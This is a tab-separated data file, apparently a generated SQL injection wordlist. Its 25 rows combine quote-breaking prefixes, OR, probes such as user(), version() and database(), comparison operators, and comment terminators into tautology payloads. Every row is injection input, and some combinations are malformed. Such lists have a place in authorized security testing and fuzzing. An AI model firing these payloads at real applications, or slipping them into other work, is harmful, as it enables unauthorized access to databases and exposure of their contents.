pre	or	var	symbol	suffix	post
1	OR	user()	!=	1	--
'	OR	version	=	'%a%'	#
a'	OR	database()	LIKE	%27	#'
1	OR	1	LIKE	a	#
a'	OR	database()	!=	1	#
'	OR	'	=	%27	--
1	OR	'	!=	'	#'
a'	OR	1	!=	%27	--
a'	OR	version	=	a	#'
'	OR	1	=	1	#'
'	OR	'	LIKE	1	#
1	OR	version	LIKE	%27	--
a'	OR	user()	LIKE	'%a%'	#'
'	OR	'	!=	a	--
a'	OR	'	!=	'%a%'	--
'	OR	1	=	'	#
1	OR	user()	=	a	#
'	OR	database()	LIKE	'	--
1	OR	database()	=	a	#
1	OR	database()	=	'%a%'	#'
a'	OR	version	!=	'	#
'	OR	user()	!=	%27	#
'	OR	version	!=	1	#
1	OR	user()	=	'	#'
1	OR	1	=	'%a%'	--
